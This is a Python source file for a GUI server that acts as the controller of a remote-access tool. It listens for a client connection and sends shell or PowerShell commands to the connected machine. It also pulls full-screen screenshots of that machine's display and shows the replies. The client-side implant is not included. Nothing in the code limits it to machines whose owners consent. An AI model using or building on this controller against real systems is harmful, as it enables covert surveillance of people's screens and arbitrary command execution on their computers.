import customtkinter
import socket
import threading
import atexit
import time
import platform
import subprocess
import os
import select

class Server(customtkinter.CTk):
    def __init__(self, ip, port):
        self.IP = ip
        self.PORT = port
        self.controling = False
        self.started_socket = False
        self.conn = None

        atexit.register(self.cleanup)

        super().__init__()
        self.geometry("600x300")
        self.resizable(False, False)

        self.response_text = customtkinter.CTkLabel(self, text="", font=(..., 15), wraplength=500, height=170, width=500)
        self.response_text.pack(pady=5)

        self.entry = customtkinter.CTkEntry(self, placeholder_text="Enter your command", width=350)
        self.entry.pack()

        self.entry.bind("<Return>", self.on_enter)  # Bind Enter key to command sending

        self.start_button = customtkinter.CTkButton(self, text="Start Socket", font=(..., 15), width=150, command=self.bind_thread)
        self.start_button.pack(padx=0, pady=10)

        self.feedback_text = customtkinter.CTkLabel(self, text="", font=(..., 15))
        self.feedback_text.pack(pady=5)

    def on_enter(self, event):
        self.handle_command()

    def bind_thread(self):
        t = threading.Thread(target=self.start_server)
        t.start()

    def start_server(self):
        if not self.conn and self.started_socket:
            return

        if not self.started_socket:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.IP, self.PORT))
            self.sock.listen(1)
            self.set_feedback(f"Listening at {self.IP}:{self.PORT}.")
            self.start_button.configure(text="Stop Socket")

            t = threading.Thread(target=self.accept)
            t.start()
        else:
            self.start_button.configure(text="Start Socket")
            t = threading.Thread(target=self.cleanup)
            t.start()

        self.started_socket = not self.started_socket

    def set_feedback(self, Text):
        self.feedback_text.configure(text=Text)

    def set_response(self, Text):
        self.response_text.configure(text=Text)

    def handle_command(self):
        cmd = self.entry.get().lower()
        if cmd:
            self.send_command(cmd)
            self.entry.delete(0, customtkinter.END)

            if cmd == "exit":
                self.cleanup()
            elif cmd == "screenshot":
                self.receive_screenshot()
            elif cmd == "getos":
                self.get_os()
            elif cmd == "clear":
                self.clear_terminal()
            elif cmd == "help":
                self.show_help()
            else:
                self.execute_command(cmd)

    def send_command(self, cmd):
        if self.conn:
            self.conn.send(cmd.encode())

    def cleanup(self):
        self.controling = False
        if self.conn:
            self.conn.send("exit".encode())
        if self.sock:
            self.sock.close()
        self.set_feedback("Socket closed.")
        time.sleep(1)
        self.set_feedback("")

    def accept(self):
        self.conn, self.addr = self.sock.accept()
        self.conn.send(str("name").encode())
        data = self.conn.recv(1024).decode(errors='ignore') 
        self.set_feedback(f"Let's welcome '{data}'")
        self.controling = True

    def receive_screenshot(self):
        try:
            file_size = int.from_bytes(self.conn.recv(4), 'big')
            screenshot_filename = "received_screenshot.png"
            received_size = 0
            screenshot_data = b""

            max_seconds = 5

            if not os.path.exists(screenshot_filename):
                open(screenshot_filename, "x").close()

            while received_size < file_size:
                ready = select.select([self.conn], [], [], max_seconds)
                if ready[0]:
                    packet = self.conn.recv(min(1024, file_size - received_size))
                    if not packet:
                        break
                    screenshot_data += packet
                    received_size += len(packet)
                else:
                    self.set_response("Failed to get screenshot: Timeout exceeded.")
                    return

            with open(screenshot_filename, "wb") as f:
                f.write(screenshot_data)

            self.set_response(f"Screenshot received and saved as '{screenshot_filename}'.")

            try:
                current_os = platform.system()
                if current_os == "Darwin":
                    subprocess.Popen(["open", screenshot_filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif current_os == "Linux":
                    subprocess.Popen(["xdg-open", screenshot_filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif current_os == "Windows":
                    os.startfile(screenshot_filename)
                else:
                    self.set_response(f"Unsupported OS: {current_os}. Cannot open the image.")
            except Exception as e:
                self.set_response(f"Failed to open image: {str(e)}")

        except Exception as e:
            self.set_response(f"Failed to receive screenshot: {str(e)}")

    def get_os(self):
        max_seconds = 2
        ready = select.select([self.conn], [], [], max_seconds)
        if ready[0]:
            data = self.conn.recv(1024).decode()
            self.set_response(f"Client OS: {data}")
        else:
            self.set_response("Command response timeout.")

    def execute_command(self, cmd):
        max_seconds = 2
        ready = select.select([self.conn], [], [], max_seconds)
        if ready[0]:
            data = self.conn.recv(1024).decode()
            self.set_response(data)
        else:
            self.set_response("Command response timeout.")

    def clear_terminal(self):
        self.set_response("\n" * 100 + "Cleared terminal.\n")

    def show_help(self):
        help_text = (
            "\n-- Help --\n"
            "exit -> send message to client to exit and then close the socket.\n"
            "screenshot -> take a full screen screenshot of the clients screen\n"
            "getos -> get the clients operating system\n"
            "clear -> clear the terminal window\n"
            "You can type 'powershell' before your command to execute a PowerShell command (if Windows)\n"
        )
        self.set_response(help_text)

IP = "127.0.0.1"
PORT = 12364

app = Server(IP, PORT)
app.mainloop()
